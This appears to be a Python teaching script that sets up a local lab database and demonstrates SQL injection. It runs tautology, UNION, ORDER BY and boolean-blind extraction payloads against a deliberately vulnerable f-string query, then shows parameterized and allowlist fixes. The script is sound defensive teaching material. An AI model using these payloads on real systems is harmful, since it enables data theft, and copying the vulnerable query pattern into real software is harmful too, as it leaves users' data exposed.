"""
Layer 7 · Topic 2 — SQL injection as a string-building failure (Python/psycopg3).

One command, no arguments. Bootstraps an ephemeral `sqli_lab` database on
localhost, seeds three users and a secret 32-char api key, then runs four
payload families against a /search endpoint in two modes:

  vulnerable     -- the query is built with an f-string: the attacker's bytes
                    become SQL SYNTAX, not a value.
  parameterized  -- psycopg3 sends `WHERE email = %s` and the value in a
                    separate Bind message; the bytes never touch the SQL the
                    server parses.

psycopg3 detail worth knowing (README): it binds SERVER-SIDE by default --
the value never enters the SQL string on the client either. This is a real
change from psycopg2's client-side mogrify. Identifiers (ORDER BY column)
cannot be bound at all -- that is a protocol fact demonstrated in the
order-by section, not a library limitation.

What to look for: the tautology dumps all 3 users when vulnerable and 0 rows
(NOT an error) when parameterized; UNION pulls the secret key out only when
vulnerable; and the blind channel recovers all 32 characters in a request
count that is roughly linear in the key length -- the number that proves
"it only returns a boolean" is not a mitigation.
"""
import sys
import time

try:
    import psycopg
except ImportError:
    print("psycopg3 not installed -> pip install 'psycopg[binary]'")
    sys.exit(0)

SUPER_DSN = "postgresql://localhost:5432/postgres"
LAB_DSN = "postgresql://localhost:5432/sqli_lab"
SECRET_KEY = "S3CR3T_KEY_abcdef0123456789abcd0"  # 32 chars
CHARSET = ("ABCDEFGHIJKLMNOPQRSTUVWXYZ"
           "abcdefghijklmnopqrstuvwxyz0123456789_")


def bootstrap():
    with psycopg.connect(SUPER_DSN, autocommit=True) as c:
        c.execute("DROP DATABASE IF EXISTS sqli_lab WITH (FORCE)")
        c.execute("CREATE DATABASE sqli_lab")
    with psycopg.connect(LAB_DSN, autocommit=True) as c:
        c.execute("CREATE TABLE users (id int PRIMARY KEY, email text, name text)")
        c.execute("CREATE TABLE api_keys (user_id int PRIMARY KEY, key text)")
        for i, n in enumerate(("alice", "bob", "carol"), start=1):
            c.execute("INSERT INTO users VALUES (%s,%s,%s)", (i, f"{n}@lab.test", n))
        c.execute("INSERT INTO api_keys VALUES (1, %s)", (SECRET_KEY,))


def search_vulnerable(conn, email):
    # THE BUG: the value is concatenated into the SQL text.
    sql = f"SELECT id, email, name FROM users WHERE email = '{email}'"
    try:
        return conn.execute(sql).fetchall(), None
    except psycopg.errors.Error as e:
        return None, e.diag.message_primary


def search_parameterized(conn, email):
    sql = "SELECT id, email, name FROM users WHERE email = %s"
    try:
        return conn.execute(sql, (email,)).fetchall(), None
    except psycopg.errors.Error as e:
        return None, e.diag.message_primary


def list_vulnerable(conn, sort):
    # Identifier injection: you cannot bind a column name (see order-by note).
    sql = f"SELECT id, email, name FROM users ORDER BY {sort}"
    try:
        return conn.execute(sql).fetchall(), None
    except psycopg.errors.Error as e:
        return None, e.diag.message_primary


def list_allowlist(conn, sort):
    allowed = {"id", "email", "name"}
    if sort not in allowed:
        return None, f"rejected identifier {sort!r} (not in allowlist)"
    return conn.execute(f"SELECT id, email, name FROM users ORDER BY {sort}").fetchall(), None


def part_ab(conn):
    print("Payload 1 — boolean tautology  \"' OR '1'='1\"")
    for label, fn in (("vulnerable", search_vulnerable), ("parameterized", search_parameterized)):
        rows, err = fn(conn, "' OR '1'='1")
        got = f"{len(rows)} rows: {[r[2] for r in rows]}" if rows is not None else f"ERROR: {err}"
        print(f"   {label:<14} -> {got}")

    print("\nPayload 2 — UNION cross-table (steal api_keys.key)")
    union = "' UNION SELECT user_id, key, key FROM api_keys--"
    for label, fn in (("vulnerable", search_vulnerable), ("parameterized", search_parameterized)):
        rows, err = fn(conn, union)
        if rows is None:
            print(f"   {label:<14} -> ERROR: {err}")
        else:
            leaked = [r[1] for r in rows if r[1] == SECRET_KEY]
            print(f"   {label:<14} -> {len(rows)} rows; secret leaked: "
                  f"{leaked[0] if leaked else 'no'}")

    print("\nPayload 4 — identifier injection on ORDER BY  (cannot be bound)")
    for label, fn in (("parameterized*", list_vulnerable), ("allowlist", list_allowlist)):
        rows, err = fn(conn, "(SELECT key FROM api_keys LIMIT 1)")
        outcome = f"{len(rows)} rows (injection ran in ORDER BY!)" if rows is not None else err
        print(f"   {label:<14} -> {outcome}")
    print("   *note: parameterizing the WHERE does NOT close ORDER BY -- the "
          "column position in the parse tree is fixed at Parse time, before "
          "any Bind value exists.")


def part_c_blind(conn):
    print("\nPayload 3 — boolean-blind extraction of the 32-char key")
    charset = CHARSET
    recovered = []
    requests = 0
    t0 = time.perf_counter()
    for pos in range(1, len(SECRET_KEY) + 1):
        for ch in charset:
            requests += 1
            # The endpoint reveals only found / not-found (rows > 0).
            payload = (f"nope' OR substr((SELECT key FROM api_keys "
                       f"WHERE user_id=1),{pos},1)='{ch}")
            rows, _ = search_vulnerable(conn, payload)
            if rows:  # found: this char is correct
                recovered.append(ch)
                break
    secs = time.perf_counter() - t0
    key = "".join(recovered)
    n = len(SECRET_KEY)
    linear_expected = n * (len(charset) + 1) // 2   # avg half the charset/char
    binsearch_expected = n * 7                        # ceil(log2(63)) ~ 6-7 per char
    print(f"   recovered: {key}")
    print(f"   correct:   {'YES' if key == SECRET_KEY else 'NO'}")
    print(f"   requests to recover {n} chars, one char/request (measured): {requests}")
    print(f"   wall-clock: {secs*1000:.0f} ms")
    print(f"   theory: linear ~{linear_expected} req; "
          f"binary-search per char ~{binsearch_expected} req "
          f"(ratio ~{linear_expected/binsearch_expected:.1f}x) -- "
          f"'blind' buys the attacker a bigger bill, not safety.")


def main():
    print("Layer 7 · Topic 2 — SQL injection (Python / psycopg3, real Postgres)\n")
    try:
        bootstrap()
    except psycopg.OperationalError as e:
        print(f"Postgres unreachable -> {str(e).strip()}")
        print("Start Postgres and re-run. The code is the artifact.")
        return
    with psycopg.connect(LAB_DSN, autocommit=True) as conn:
        part_ab(conn)
        part_c_blind(conn)
    print("\nTakeaway: parameterization separates code from data -- the value "
          "rides in Bind, never Parse. It is the SAME move as Topic 3's "
          "context-aware escaping and safe against command injection: never "
          "let attacker bytes reach a parser as syntax.")


if __name__ == "__main__":
    main()
